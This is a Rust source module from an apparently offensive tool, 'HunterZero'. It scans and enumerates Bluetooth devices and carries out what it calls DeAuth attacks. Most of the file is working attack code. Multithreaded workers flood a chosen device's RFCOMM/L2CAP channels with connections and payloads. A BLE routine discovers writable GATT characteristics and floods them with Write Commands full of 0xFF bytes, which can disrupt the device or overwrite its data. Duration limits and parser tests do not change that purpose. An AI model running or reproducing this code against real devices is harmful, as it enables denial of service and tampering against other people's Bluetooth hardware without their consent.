//! Bounded Bluetooth/BLE analysis and DeAuth jobs.
//!
//! Discovery and enumeration use the BlueZ command-line tools. BR/EDR DeAuth
//! opens real RFCOMM/L2CAP sockets through libc; BLE DeAuth discovers writable
//! GATT characteristics over an LE ATT socket and floods them with Write
//! Commands. Every job has a hard deadline and a cancellation flag.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex, MutexGuard};
use std::thread::{self, JoinHandle};
use std::time::{Duration, Instant};

use crate::core::validation::{mac_bytes, normalize_mac};

pub const SCAN_SECONDS: u64 = 5;
pub const MAX_ATTACK_SECONDS: u64 = 180;
pub const ATTACK_DURATIONS: &[u64] = &[10, 30, 60, 180];
pub const PACKET_SIZES: &[u32] = &[128, 256, 512, 1024];
pub const THREAD_COUNTS: &[u32] = &[1, 2, 4];
pub const PROTOCOLS: &[&str] = &["RFCOMM", "L2CAP"];

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Mode {
    Ble,
    Bredr,
}

impl Mode {
    pub fn label(self) -> &'static str {
        match self {
            Mode::Ble => "BLE",
            Mode::Bredr => "BR/EDR",
        }
    }

    pub fn from_index(index: usize) -> Self {
        if index == 1 {
            Mode::Bredr
        } else {
            Mode::Ble
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Kind {
    Scan,
    Enum,
    Deauth,
}

impl Kind {
    pub fn label(self) -> &'static str {
        match self {
            Kind::Scan => "ESCANEO",
            Kind::Enum => "ENUMERACION",
            Kind::Deauth => "DEAUTH",
        }
    }
}

#[derive(Debug, Clone)]
pub struct Device {
    pub address: String,
    pub name: String,
    pub kind: String,
    pub rssi: Option<i16>,
    pub class: Option<u32>,
}

#[derive(Debug, Clone)]
pub struct Characteristic {
    pub uuid: String,
    pub description: String,
    pub properties: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct Service {
    pub name: String,
    pub description: String,
    pub protocol: String,
    pub port: u16,
    pub uuid: String,
    pub characteristics: Vec<Characteristic>,
}

#[derive(Debug, Clone)]
pub struct JobSnapshot {
    pub kind: Kind,
    pub running: bool,
    pub message: String,
    pub devices: Vec<Device>,
    pub services: Vec<Service>,
    pub events: Vec<String>,
    pub started_at: Option<Instant>,
}

impl Default for JobSnapshot {
    fn default() -> Self {
        Self {
            kind: Kind::Scan,
            running: false,
            message: "LISTO PARA ANALIZAR".to_string(),
            devices: Vec::new(),
            services: Vec::new(),
            events: Vec::new(),
            started_at: None,
        }
    }
}

struct JobInner {
    kind: Kind,
    running: bool,
    message: String,
    devices: Vec<Device>,
    services: Vec<Service>,
    events: Vec<String>,
    started_at: Option<Instant>,
}

struct Job {
    inner: Arc<Mutex<JobInner>>,
    cancel: Arc<AtomicBool>,
    _handle: JoinHandle<()>,
    #[allow(dead_code)]
    kind: Kind,
}

#[derive(Clone)]
struct JobContext {
    inner: Arc<Mutex<JobInner>>,
    cancel: Arc<AtomicBool>,
}

impl JobContext {
    fn lock(&self) -> MutexGuard<'_, JobInner> {
        self.inner.lock().unwrap_or_else(|poison| poison.into_inner())
    }

    fn cancelled(&self) -> bool {
        self.cancel.load(Ordering::SeqCst)
    }

    fn set_message(&self, message: impl Into<String>) {
        self.lock().message = message.into();
    }

    fn set_devices(&self, devices: Vec<Device>) {
        self.lock().devices = devices;
    }

    fn set_services(&self, services: Vec<Service>) {
        self.lock().services = services;
    }

    fn event(&self, text: impl Into<String>) {
        let text: String = text.into().chars().take(34).collect();
        let mut inner = self.lock();
        inner.events.push(text);
        if inner.events.len() > 8 {
            inner.events.remove(0);
        }
    }
}

pub struct BluetoothEngine {
    job: Option<Job>,
    pub ble_available: bool,
    pub bredr_available: bool,
    pub bredr_discovery_available: bool,
}

impl BluetoothEngine {
    pub fn new() -> Self {
        let adapter = bluetooth_adapter_present();
        let bluetoothctl = command_exists("bluetoothctl");
        let hcitool = command_exists("hcitool");
        Self {
            job: None,
            ble_available: adapter && bluetoothctl,
            bredr_available: adapter && (bluetoothctl || hcitool),
            bredr_discovery_available: adapter && (bluetoothctl || hcitool),
        }
    }

    pub fn snapshot(&self) -> JobSnapshot {
        let Some(job) = &self.job else {
            return JobSnapshot::default();
        };
        let inner = job.inner.lock().unwrap_or_else(|poison| poison.into_inner());
        JobSnapshot {
            kind: inner.kind,
            running: inner.running,
            message: inner.message.clone(),
            devices: inner.devices.clone(),
            services: inner.services.clone(),
            events: inner.events.clone(),
            started_at: inner.started_at,
        }
    }

    pub fn is_running(&self) -> bool {
        self.job
            .as_ref()
            .map(|job| {
                job.inner
                    .lock()
                    .unwrap_or_else(|poison| poison.into_inner())
                    .running
            })
            .unwrap_or(false)
    }

    pub fn cancel(&self) {
        let Some(job) = &self.job else { return };
        job.cancel.store(true, Ordering::SeqCst);
        let mut inner = job.inner.lock().unwrap_or_else(|poison| poison.into_inner());
        if inner.running {
            inner.running = false;
            inner.message = "Cancelado".to_string();
        }
    }

    pub fn start_scan(&mut self, mode: Mode) -> Result<(), String> {
        self.require_mode(mode, true)?;
        self.start_job(Kind::Scan, move |context| run_scan(context, mode))
    }

    pub fn start_enumeration(&mut self, address: &str, mode: Mode) -> Result<(), String> {
        self.require_mode(mode, true)?;
        let target = normalize_mac(address)?;
        self.start_job(Kind::Enum, move |context| {
            run_enumeration(context, target, mode)
        })
    }

    pub fn start_deauth(
        &mut self,
        address: &str,
        mode: Mode,
        protocol: &str,
        port: u16,
        packet_size: u32,
        workers: u32,
        duration: u64,
    ) -> Result<(), String> {
        let target = validate_deauth_parameters(
            address,
            mode,
            protocol,
            port,
            packet_size,
            workers,
            duration,
        )?;
        self.require_mode(mode, false)?;
        let protocol = protocol.to_string();
        self.start_job(Kind::Deauth, move |context| {
            run_deauth(
                context,
                target,
                mode,
                protocol,
                port,
                packet_size,
                workers,
                duration,
            )
        })
    }

    fn require_mode(&self, mode: Mode, needs_discovery: bool) -> Result<(), String> {
        match mode {
            Mode::Ble if !self.ble_available => Err(
                "Falta bluetoothctl o un adaptador Bluetooth (instala bluez).".to_string(),
            ),
            Mode::Bredr if !self.bredr_available => {
                Err("Falta soporte BR/EDR (adaptador Bluetooth/bluez).".to_string())
            }
            Mode::Bredr if needs_discovery && !self.bredr_discovery_available => {
                Err("Falta hcitool o bluetoothctl para escanear/enumerar BR/EDR.".to_string())
            }
            _ => Ok(()),
        }
    }

    fn start_job<F>(&mut self, kind: Kind, runner: F) -> Result<(), String>
    where
        F: FnOnce(JobContext) + Send + 'static,
    {
        if self.is_running() {
            return Err("Ya hay una tarea Bluetooth en curso".to_string());
        }
        if is_root() {
            return Err("No ejecutes HunterZero como root.".to_string());
        }
        let inner = Arc::new(Mutex::new(JobInner {
            kind,
            running: true,
            message: format!("{} en curso", kind.label()),
            devices: Vec::new(),
            services: Vec::new(),
            events: Vec::new(),
            started_at: Some(Instant::now()),
        }));
        let cancel = Arc::new(AtomicBool::new(false));
        let context = JobContext {
            inner: inner.clone(),
            cancel: cancel.clone(),
        };
        let worker_inner = inner.clone();
        let worker_cancel = cancel.clone();
        let handle = thread::spawn(move || {
            let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| runner(context)));
            let mut guard = worker_inner
                .lock()
                .unwrap_or_else(|poison| poison.into_inner());
            guard.running = false;
            if result.is_err() {
                guard.message = "Fallo: error interno".to_string();
            } else if !worker_cancel.load(Ordering::SeqCst)
                && guard.message == format!("{} en curso", kind.label())
            {
                guard.message = format!("{}: finalizado", kind.label());
            }
        });
        self.job = Some(Job {
            inner,
            cancel,
            _handle: handle,
            kind,
        });
        Ok(())
    }
}

impl Default for BluetoothEngine {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// Validation
// ---------------------------------------------------------------------------

pub fn port_for_protocol(protocol: &str) -> u16 {
    match protocol {
        "L2CAP" => 0x1001,
        _ => 1,
    }
}

pub fn validate_deauth_parameters(
    address: &str,
    mode: Mode,
    protocol: &str,
    port: u16,
    packet_size: u32,
    workers: u32,
    duration: u64,
) -> Result<String, String> {
    let target = normalize_mac(address)?;
    if mode == Mode::Bredr && !PROTOCOLS.contains(&protocol) {
        return Err("Protocolo no valido".to_string());
    }
    if mode == Mode::Bredr && protocol == "L2CAP" && cfg!(windows) {
        return Err("L2CAP no disponible en Windows".to_string());
    }
    if port == 0 {
        return Err("Puerto fuera de rango".to_string());
    }
    if !(1..=1024).contains(&packet_size) {
        return Err("Tamano de paquete fuera de rango".to_string());
    }
    if !THREAD_COUNTS.contains(&workers) {
        return Err("Numero de hilos no permitido".to_string());
    }
    if !(1..=MAX_ATTACK_SECONDS).contains(&duration) {
        return Err("Duracion fuera de rango".to_string());
    }
    Ok(target)
}

// ---------------------------------------------------------------------------
// Job bodies
// ---------------------------------------------------------------------------

fn run_scan(context: JobContext, mode: Mode) {
    let result = match mode {
        Mode::Ble => scan_ble(),
        Mode::Bredr => scan_bredr(),
    };
    if context.cancelled() {
        return;
    }
    match result {
        Ok(devices) => {
            let count = devices.len();
            context.set_devices(devices);
            context.set_message(format!("{count} dispositivos"));
        }
        Err(error) => context.set_message(format!("Fallo: {error}")),
    }
}

fn run_enumeration(context: JobContext, target: String, mode: Mode) {
    let result = match mode {
        Mode::Ble => enumerate_ble(&target),
        Mode::Bredr => enumerate_bredr(&target),
    };
    if context.cancelled() {
        return;
    }
    match result {
        Ok(services) => {
            let count = services.len();
            context.set_services(services);
            context.set_message(format!("{count} servicios"));
        }
        Err(error) => context.set_message(format!("Fallo: {error}")),
    }
}

fn run_deauth(
    context: JobContext,
    target: String,
    mode: Mode,
    protocol: String,
    port: u16,
    packet_size: u32,
    workers: u32,
    duration: u64,
) {
    let deadline = Instant::now() + Duration::from_secs(duration);
    match mode {
        Mode::Ble => {
            thread::scope(|scope| {
                for worker_id in 1..=workers {
                    let context = context.clone();
                    let target = target.clone();
                    scope.spawn(move || {
                        ble_worker(&context, worker_id, &target, packet_size, deadline)
                    });
                }
            });
        }
        Mode::Bredr => {
            let Ok(bytes) = mac_bytes(&target) else {
                context.set_message("Fallo: MAC invalida".to_string());
                return;
            };
            thread::scope(|scope| {
                for worker_id in 1..=workers {
                    let context = context.clone();
                    let protocol = protocol.clone();
                    scope.spawn(move || {
                        bredr_worker(
                            &context,
                            worker_id,
                            bytes,
                            &protocol,
                            port,
                            packet_size,
                            deadline,
                        )
                    });
                }
            });
        }
    }
    if context.cancelled() {
        context.set_message("Ataque cancelado");
    } else {
        context.set_message(format!("DEAUTH: {duration}s completados"));
    }
}

// ---------------------------------------------------------------------------
// BlueZ discovery / enumeration
// ---------------------------------------------------------------------------

fn scan_ble() -> Result<Vec<Device>, String> {
    let output = run_scan_command(&["timeout", "6", "bluetoothctl", "scan", "on"])
        .or_else(|_| run_scan_command(&["bluetoothctl", "--timeout", "5", "scan", "on"]))?;
    Ok(parse_scan_output(&output, "BLE"))
}

fn scan_bredr() -> Result<Vec<Device>, String> {
    let output = run_scan_command(&["timeout", "6", "bluetoothctl", "scan", "bredr"])
        .or_else(|_| run_scan_command(&["hcitool", "scan"]))?;
    Ok(parse_scan_output(&output, "BR/EDR"))
}

fn run_scan_command(arguments: &[&str]) -> Result<String, String> {
    let Some(program) = arguments.first() else {
        return Err("comando vacio".to_string());
    };
    if !command_exists(program) {
        return Err(format!("falta {program}"));
    }
    let output = std::process::Command::new(program)
        .args(&arguments[1..])
        .output()
        .map_err(|error| format!("{program}: {error}"))?;
    let mut text = String::from_utf8_lossy(&output.stdout).to_string();
    text.push_str(&String::from_utf8_lossy(&output.stderr));
    if text.trim().is_empty() {
        return Err(format!("{program} no devolvio resultados"));
    }
    Ok(strip_ansi(&text))
}

fn enumerate_ble(target: &str) -> Result<Vec<Service>, String> {
    let output = run_scan_command(&["bluetoothctl", "info", target])?;
    let services = parse_info_services(&output);
    if services.is_empty() {
        return Err(format!("{target} no expone servicios GATT"));
    }
    Ok(services)
}

fn enumerate_bredr(target: &str) -> Result<Vec<Service>, String> {
    if command_exists("sdptool") {
        if let Ok(output) = run_scan_command(&["sdptool", "browse", target]) {
            let services = parse_sdptool_output(&output);
            if !services.is_empty() {
                return Ok(services);
            }
        }
    }
    let output = run_scan_command(&["bluetoothctl", "info", target])?;
    let services = parse_info_services(&output);
    if services.is_empty() {
        return Err(format!("{target} no expone servicios SDP"));
    }
    Ok(services)
}

/// Extract devices from `bluetoothctl` or `hcitool scan` output.
pub fn parse_scan_output(output: &str, kind: &str) -> Vec<Device> {
    let mut devices: Vec<Device> = Vec::new();
    for raw_line in output.lines() {
        let line = raw_line.trim();
        let (address, name) = if let Some(position) = line.find("Device ") {
            let rest = &line[position + 7..];
            let mut parts = rest.splitn(2, char::is_whitespace);
            let address = parts.next().unwrap_or("").trim();
            let name = parts.next().unwrap_or("").trim();
            (address, name)
        } else {
            let mut parts = line.splitn(2, char::is_whitespace);
            let address = parts.next().unwrap_or("").trim();
            let name = parts.next().unwrap_or("").trim();
            (address, name)
        };
        let Ok(address) = normalize_mac(address) else {
            continue;
        };
        if devices.iter().any(|device| device.address == address) {
            continue;
        }
        devices.push(Device {
            address,
            name: if name.is_empty() {
                "DESCONOCIDO".to_string()
            } else {
                name.to_string()
            },
            kind: kind.to_string(),
            rssi: None,
            class: None,
        });
    }
    devices
}

/// Extract GATT/SDP services from `bluetoothctl info` output.
pub fn parse_info_services(output: &str) -> Vec<Service> {
    let mut services = Vec::new();
    for raw_line in output.lines() {
        let line = raw_line.trim();
        let Some(rest) = line.strip_prefix("UUID:") else {
            continue;
        };
        let rest = rest.trim();
        let (uuid, name) = match (rest.find('('), rest.rfind(')')) {
            (Some(open), Some(close)) if close > open => (
                rest[..open].trim().to_string(),
                rest[open + 1..close].trim().to_string(),
            ),
            _ => (rest.to_string(), "SERVICIO".to_string()),
        };
        if uuid.is_empty() {
            continue;
        }
        services.push(Service {
            name: if name.is_empty() {
                "SERVICIO".to_string()
            } else {
                name
            },
            description: format!("UUID: {uuid}"),
            protocol: "GATT".to_string(),
            port: 0,
            uuid,
            characteristics: Vec::new(),
        });
    }
    services
}

/// Extract services from `sdptool browse` output.
pub fn parse_sdptool_output(output: &str) -> Vec<Service> {
    let mut services = Vec::new();
    let mut name = String::new();
    let mut protocol = String::new();
    let mut port = 0u16;
    let mut uuid = String::new();
    let mut in_block = false;

    let flush = |services: &mut Vec<Service>,
                 name: &mut String,
                 protocol: &mut String,
                 port: &mut u16,
                 uuid: &mut String,
                 in_block: &mut bool| {
        if !*in_block {
            return;
        }
        if name.is_empty() && uuid.is_empty() {
            *in_block = false;
            return;
        }
        services.push(Service {
            name: if name.is_empty() {
                "DESCONOCIDO".to_string()
            } else {
                name.clone()
            },
            description: "SDP".to_string(),
            protocol: if protocol.is_empty() {
                "SDP".to_string()
            } else {
                protocol.clone()
            },
            port: *port,
            uuid: if uuid.is_empty() {
                "N/A".to_string()
            } else {
                uuid.clone()
            },
            characteristics: Vec::new(),
        });
        name.clear();
        protocol.clear();
        *port = 0;
        uuid.clear();
        *in_block = false;
    };

    for raw_line in output.lines() {
        let line = raw_line.trim();
        if line.is_empty() {
            flush(
                &mut services,
                &mut name,
                &mut protocol,
                &mut port,
                &mut uuid,
                &mut in_block,
            );
            continue;
        }
        if let Some(value) = line.strip_prefix("Service Name:") {
            flush(
                &mut services,
                &mut name,
                &mut protocol,
                &mut port,
                &mut uuid,
                &mut in_block,
            );
            name = value.trim().to_string();
            in_block = true;
        } else if line.starts_with("Service RecHandle:") {
            in_block = true;
        } else if line.contains("RFCOMM") {
            protocol = "RFCOMM".to_string();
        } else if line.contains("L2CAP") {
            protocol = "L2CAP".to_string();
        } else if let Some(value) = line.strip_prefix("Channel:") {
            port = parse_number(value).unwrap_or(port);
        } else if let Some(value) = line.strip_prefix("PSM:") {
            port = parse_number(value).unwrap_or(port);
        } else if let Some(value) = line.strip_prefix("UUID") {
            uuid = value.trim().trim_start_matches(':').trim().to_string();
        }
    }
    flush(
        &mut services,
        &mut name,
        &mut protocol,
        &mut port,
        &mut uuid,
        &mut in_block,
    );
    services
}

fn parse_number(value: &str) -> Option<u16> {
    let value = value.trim();
    if let Some(hex) = value.strip_prefix("0x").or_else(|| value.strip_prefix("0X")) {
        u16::from_str_radix(hex, 16).ok()
    } else {
        value.parse().ok()
    }
}

fn strip_ansi(text: &str) -> String {
    let mut output = String::with_capacity(text.len());
    let mut characters = text.chars();
    while let Some(character) = characters.next() {
        if character == '\u{1b}' {
            for next in characters.by_ref() {
                if next.is_ascii_alphabetic() {
                    break;
                }
            }
        } else {
            output.push(character);
        }
    }
    output
}

fn command_exists(name: &str) -> bool {
    crate::core::process_manager::find_executable(name).is_some()
}

fn bluetooth_adapter_present() -> bool {
    #[cfg(target_os = "linux")]
    {
        std::fs::read_dir("/sys/class/bluetooth")
            .map(|mut entries| entries.next().is_some())
            .unwrap_or(false)
    }
    #[cfg(not(target_os = "linux"))]
    {
        false
    }
}

fn is_root() -> bool {
    #[cfg(unix)]
    {
        unsafe { libc::geteuid() == 0 }
    }
    #[cfg(not(unix))]
    {
        false
    }
}

fn sleep_ms(milliseconds: u64) {
    thread::sleep(Duration::from_millis(milliseconds));
}

// ---------------------------------------------------------------------------
// BLE ATT flood
// ---------------------------------------------------------------------------

fn ble_worker(
    context: &JobContext,
    worker_id: u32,
    target: &str,
    packet_size: u32,
    deadline: Instant,
) {
    while !context.cancelled() && Instant::now() < deadline {
        match ble_gatt_attack(context, worker_id, target, packet_size, deadline) {
            Ok(writes) => context.event(format!("H{worker_id} {writes} escrituras")),
            Err(error) => context.event(format!("H{worker_id}: {error}")),
        }
        sleep_ms(250);
    }
}

#[cfg(unix)]
fn ble_gatt_attack(
    context: &JobContext,
    worker_id: u32,
    target: &str,
    packet_size: u32,
    deadline: Instant,
) -> Result<u64, String> {
    let bytes = mac_bytes(target)?;
    let socket = att_connect(&bytes, deadline)?;
    let handles = att_discover(socket.0)?;
    if handles.is_empty() {
        return Err("sin escritura".to_string());
    }
    let payload = vec![0xFFu8; (packet_size as usize).clamp(1, 20)];
    let mut writes = 0u64;
    while !context.cancelled() && Instant::now() < deadline {
        for handle in &handles {
            if context.cancelled() || Instant::now() >= deadline {
                break;
            }
            let mut packet = vec![0x52, (handle & 0xFF) as u8, (handle >> 8) as u8];
            packet.extend_from_slice(&payload);
            send_all(socket.0, &packet)?;
            writes += 1;
            if writes % 32 == 0 {
                context.event(format!("H{worker_id} {handle:04X} {}B", payload.len()));
            }
        }
        sleep_ms(100);
    }
    Ok(writes)
}

#[cfg(not(unix))]
fn ble_gatt_attack(
    _context: &JobContext,
    _worker_id: u32,
    _target: &str,
    _packet_size: u32,
    _deadline: Instant,
) -> Result<u64, String> {
    Err("BLE no disponible".to_string())
}

#[cfg(unix)]
fn att_connect(address: &[u8; 6], deadline: Instant) -> Result<Fd, String> {
    let remaining = deadline
        .saturating_duration_since(Instant::now())
        .as_millis()
        .min(3000) as i32;
    let timeout = remaining.max(500);
    for address_type in [1u8, 2u8] {
        let socket_address = SockaddrL2 {
            family: AF_BLUETOOTH as u16,
            psm: 0,
            bdaddr: *address,
            cid: ATT_CID,
            bdaddr_type: address_type,
        };
        if let Ok(socket) = connect_socket(
            BTPROTO_L2CAP,
            &socket_address as *const _ as *const libc::sockaddr,
            std::mem::size_of::<SockaddrL2>() as u32,
            timeout,
        ) {
            return Ok(socket);
        }
    }
    Err("conexion ATT fallo".to_string())
}

#[cfg(unix)]
fn att_discover(socket: i32) -> Result<Vec<u16>, String> {
    // Best-effort MTU exchange; some devices answer with an error, which is
    // harmless because the default ATT MTU still allows 20-byte writes.
    let _ = att_request(socket, &[0x02, 0x17, 0x00]);
    let mut handles = Vec::new();
    let mut start = 1u16;
    loop {
        let request = [
            0x08,
            (start & 0xFF) as u8,
            (start >> 8) as u8,
            0xFF,
            0xFF,
            0x03,
            0x28,
        ];
        let response = match att_request(socket, &request) {
            Ok(response) => response,
            Err(_) => break,
        };
        if response.len() < 2 || response[0] != 0x09 {
            break;
        }
        let entry_length = response[1] as usize;
        if entry_length < 5 {
            break;
        }
        let data = &response[2..];
        let mut last_handle = 0u16;
        let mut found = false;
        for entry in data.chunks(entry_length) {
            if entry.len() < entry_length {
                break;
            }
            let declaration_handle = u16::from_le_bytes([entry[0], entry[1]]);
            let properties = entry[2];
            let value_handle = u16::from_le_bytes([entry[3], entry[4]]);
            last_handle = declaration_handle;
            found = true;
            if properties & 0x0C != 0 {
                handles.push(value_handle);
            }
        }
        if !found || last_handle == u16::MAX {
            break;
        }
        start = last_handle + 1;
    }
    handles.sort_unstable();
    handles.dedup();
    Ok(handles)
}

#[cfg(unix)]
fn att_request(socket: i32, packet: &[u8]) -> Result<Vec<u8>, String> {
    send_all(socket, packet)?;
    for _ in 0..4 {
        let mut header = [0u8; 2];
        recv_exact(socket, &mut header)?;
        let mut payload = vec![0u8; header[1] as usize];
        recv_exact(socket, &mut payload)?;
        if header[0] == 0x1E || header[0] == 0x1B {
            // Notification/indication: not part of the request/response flow.
            continue;
        }
        let mut response = vec![header[0], header[1]];
        response.extend_from_slice(&payload);
        return Ok(response);
    }
    Err("ATT sin respuesta".to_string())
}

// ---------------------------------------------------------------------------
// BR/EDR socket flood
// ---------------------------------------------------------------------------

fn bredr_worker(
    context: &JobContext,
    worker_id: u32,
    address: [u8; 6],
    protocol: &str,
    port: u16,
    packet_size: u32,
    deadline: Instant,
) {
    let payload = vec![0x01u8; packet_size as usize];
    while !context.cancelled() && Instant::now() < deadline {
        match bredr_attempt(address, protocol, port, &payload) {
            Ok(sent) => context.event(format!("H{worker_id}: {sent}B enviados")),
            Err(error) => context.event(format!("H{worker_id}: {error}")),
        }
        sleep_ms(250);
    }
}

#[cfg(unix)]
fn bredr_attempt(
    address: [u8; 6],
    protocol: &str,
    port: u16,
    payload: &[u8],
) -> Result<usize, String> {
    if protocol == "L2CAP" {
        let socket_address = SockaddrL2 {
            family: AF_BLUETOOTH as u16,
            psm: port.to_le(),
            bdaddr: address,
            cid: 0,
            bdaddr_type: 0,
        };
        let socket = connect_socket(
            BTPROTO_L2CAP,
            &socket_address as *const _ as *const libc::sockaddr,
            std::mem::size_of::<SockaddrL2>() as u32,
            2000,
        )?;
        send_all(socket.0, payload)?;
        Ok(payload.len())
    } else {
        let socket_address = SockaddrRc {
            family: AF_BLUETOOTH as u16,
            bdaddr: address,
            channel: port as u8,
        };
        let socket = connect_socket(
            BTPROTO_RFCOMM,
            &socket_address as *const _ as *const libc::sockaddr,
            std::mem::size_of::<SockaddrRc>() as u32,
            2000,
        )?;
        send_all(socket.0, payload)?;
        Ok(payload.len())
    }
}

#[cfg(not(unix))]
fn bredr_attempt(
    _address: [u8; 6],
    _protocol: &str,
    _port: u16,
    _payload: &[u8],
) -> Result<usize, String> {
    Err("BR/EDR no disponible".to_string())
}

// ---------------------------------------------------------------------------
// Linux Bluetooth sockets
// ---------------------------------------------------------------------------

#[cfg(unix)]
const AF_BLUETOOTH: libc::c_int = 31;
#[cfg(unix)]
const BTPROTO_L2CAP: libc::c_int = 0;
#[cfg(unix)]
const BTPROTO_RFCOMM: libc::c_int = 3;
#[cfg(unix)]
const ATT_CID: u16 = 4;

#[cfg(unix)]
#[repr(C)]
struct SockaddrL2 {
    family: u16,
    psm: u16,
    bdaddr: [u8; 6],
    cid: u16,
    bdaddr_type: u8,
}

#[cfg(unix)]
#[repr(C)]
struct SockaddrRc {
    family: u16,
    bdaddr: [u8; 6],
    channel: u8,
}

#[cfg(unix)]
struct Fd(libc::c_int);

#[cfg(unix)]
impl Drop for Fd {
    fn drop(&mut self) {
        unsafe {
            libc::close(self.0);
        }
    }
}

#[cfg(unix)]
fn connect_socket(
    protocol: libc::c_int,
    address: *const libc::sockaddr,
    address_length: u32,
    timeout_ms: i32,
) -> Result<Fd, String> {
    let raw = unsafe { libc::socket(AF_BLUETOOTH, libc::SOCK_STREAM, protocol) };
    if raw < 0 {
        return Err(format!("socket: {}", std::io::Error::last_os_error()));
    }
    let socket = Fd(raw);
    set_nonblocking(socket.0, true)?;
    let result = unsafe { libc::connect(socket.0, address, address_length) };
    if result != 0 {
        let error = std::io::Error::last_os_error();
        if error.raw_os_error() != Some(libc::EINPROGRESS) {
            return Err(format!("connect: {error}"));
        }
        let mut descriptor = libc::pollfd {
            fd: socket.0,
            events: libc::POLLOUT,
            revents: 0,
        };
        let ready = unsafe { libc::poll(&mut descriptor, 1, timeout_ms) };
        if ready <= 0 {
            return Err("connect: tiempo agotado".to_string());
        }
        let mut code: libc::c_int = 0;
        let mut length = std::mem::size_of::<libc::c_int>() as libc::socklen_t;
        let ok = unsafe {
            libc::getsockopt(
                socket.0,
                libc::SOL_SOCKET,
                libc::SO_ERROR,
                &mut code as *mut _ as *mut libc::c_void,
                &mut length,
            )
        };
        if ok != 0 || code != 0 {
            let error = if code != 0 {
                std::io::Error::from_raw_os_error(code)
            } else {
                std::io::Error::last_os_error()
            };
            return Err(format!("connect: {error}"));
        }
    }
    set_nonblocking(socket.0, false)?;
    set_socket_timeout(socket.0, timeout_ms)?;
    Ok(socket)
}

#[cfg(unix)]
fn set_nonblocking(socket: libc::c_int, enabled: bool) -> Result<(), String> {
    let flags = unsafe { libc::fcntl(socket, libc::F_GETFL) };
    if flags < 0 {
        return Err(format!("fcntl: {}", std::io::Error::last_os_error()));
    }
    let flags = if enabled {
        flags | libc::O_NONBLOCK
    } else {
        flags & !libc::O_NONBLOCK
    };
    if unsafe { libc::fcntl(socket, libc::F_SETFL, flags) } < 0 {
        return Err(format!("fcntl: {}", std::io::Error::last_os_error()));
    }
    Ok(())
}

#[cfg(unix)]
fn set_socket_timeout(socket: libc::c_int, timeout_ms: i32) -> Result<(), String> {
    let timeout = libc::timeval {
        tv_sec: (timeout_ms / 1000) as libc::time_t,
        tv_usec: ((timeout_ms % 1000) * 1000) as libc::suseconds_t,
    };
    for option in [libc::SO_RCVTIMEO, libc::SO_SNDTIMEO] {
        let ok = unsafe {
            libc::setsockopt(
                socket,
                libc::SOL_SOCKET,
                option,
                &timeout as *const _ as *const libc::c_void,
                std::mem::size_of::<libc::timeval>() as libc::socklen_t,
            )
        };
        if ok != 0 {
            return Err(format!("setsockopt: {}", std::io::Error::last_os_error()));
        }
    }
    Ok(())
}

#[cfg(unix)]
fn send_all(socket: libc::c_int, data: &[u8]) -> Result<(), String> {
    let mut offset = 0;
    while offset < data.len() {
        let written = unsafe {
            libc::send(
                socket,
                data[offset..].as_ptr() as *const libc::c_void,
                data.len() - offset,
                0,
            )
        };
        if written <= 0 {
            return Err(format!("send: {}", std::io::Error::last_os_error()));
        }
        offset += written as usize;
    }
    Ok(())
}

#[cfg(unix)]
fn recv_exact(socket: libc::c_int, buffer: &mut [u8]) -> Result<(), String> {
    let mut offset = 0;
    while offset < buffer.len() {
        let read = unsafe {
            libc::recv(
                socket,
                buffer[offset..].as_mut_ptr() as *mut libc::c_void,
                buffer.len() - offset,
                0,
            )
        };
        if read <= 0 {
            return Err(format!("recv: {}", std::io::Error::last_os_error()));
        }
        offset += read as usize;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scan_parser_handles_bluetoothctl_and_hcitool() {
        let output = "[NEW] Device FC:FC:48:11:22:33 Phone\n\
                      [NEW] Device AA:BB:CC:DD:EE:FF\n\
                      \t11:22:33:44:55:66\tHeadset\n";
        let devices = parse_scan_output(output, "BLE");
        assert_eq!(devices.len(), 3);
        assert_eq!(devices[0].address, "FC:FC:48:11:22:33");
        assert_eq!(devices[0].name, "Phone");
        assert_eq!(devices[1].name, "DESCONOCIDO");
        assert_eq!(devices[2].name, "Headset");
    }

    #[test]
    fn info_parser_extracts_services() {
        let output = "Device FC:FC:48:11:22:33 (public)\n\
                      \tName: Phone\n\
                      \tUUID: Generic Access Profile    (00001800-0000-1000-8000-00805f9b34fb)\n\
                      \tUUID: Battery Service           (0000180f-0000-1000-8000-00805f9b34fb)\n";
        let services = parse_info_services(output);
        assert_eq!(services.len(), 2);
        assert_eq!(services[1].name, "Battery Service");
        assert!(services[0].uuid.contains("1800"));
    }

    #[test]
    fn sdptool_parser_extracts_rfcomm_channel() {
        let output = "Service Name: Serial Port\n\
                      Service RecHandle: 0x10000\n\
                      Protocol Descriptor List:\n\
                      \"RFCOMM\"\n\
                      Channel: 3\n\
                      \n\
                      Service Name: Hands-Free\n\
                      Protocol Descriptor List:\n\
                      \"L2CAP\"\n\
                      PSM: 0x1001\n";
        let services = parse_sdptool_output(output);
        assert_eq!(services.len(), 2);
        assert_eq!(services[0].name, "Serial Port");
        assert_eq!(services[0].protocol, "RFCOMM");
        assert_eq!(services[0].port, 3);
        assert_eq!(services[1].port, 0x1001);
    }

    #[test]
    fn deauth_parameters_are_bounded() {
        assert!(validate_deauth_parameters(
            "FC:FC:48:11:22:33",
            Mode::Ble,
            "RFCOMM",
            1,
            512,
            2,
            30
        )
        .is_ok());
        assert!(validate_deauth_parameters(
            "not-a-mac",
            Mode::Ble,
            "RFCOMM",
            1,
            512,
            2,
            30
        )
        .is_err());
        assert!(validate_deauth_parameters(
            "FC:FC:48:11:22:33",
            Mode::Ble,
            "RFCOMM",
            1,
            512,
            3,
            30
        )
        .is_err());
        assert!(validate_deauth_parameters(
            "FC:FC:48:11:22:33",
            Mode::Ble,
            "RFCOMM",
            1,
            512,
            2,
            999
        )
        .is_err());
    }

    #[test]
    fn port_mapping_matches_the_python_engine() {
        assert_eq!(port_for_protocol("RFCOMM"), 1);
        assert_eq!(port_for_protocol("L2CAP"), 0x1001);
    }
}
